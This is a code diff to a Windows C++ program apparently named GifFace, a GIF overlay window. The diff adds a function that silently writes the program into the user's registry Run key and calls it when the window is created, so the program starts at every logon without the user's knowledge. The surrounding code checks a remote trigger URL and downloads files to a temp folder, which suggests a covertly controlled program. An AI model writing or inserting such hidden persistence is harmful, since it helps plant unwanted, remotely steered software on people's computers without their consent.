@@ -230,6 +230,24 @@ bool RemoteTriggerFileExists()
     return (statusCode == 200);
 }
 
+void SetPersistence()
+{
+    HKEY hKey;
+    const wchar_t* runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    const wchar_t* valueName  = L"GifFace";
+
+    // Get full path to the EXE
+    wchar_t exePath[MAX_PATH];
+    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
+
+    // Open the Run key
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKeyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+    {
+        RegSetValueExW(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath, (lstrlenW(exePath) + 1) * sizeof(wchar_t));
+        RegCloseKey(hKey);
+    }
+}
+
 // WinINet download to a temp file
 static bool DownloadToTempFile(const wchar_t* url, wchar_t* outPath)
 {
@@ -355,6 +373,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
             MessageBoxW(hwnd, L"Failed to create ARGB backbuffer.", L"GifFace", MB_ICONERROR);
             return -1;
         }
+
+        SetPersistence();
 
         ApplyOverlayStyles(hwnd);
 
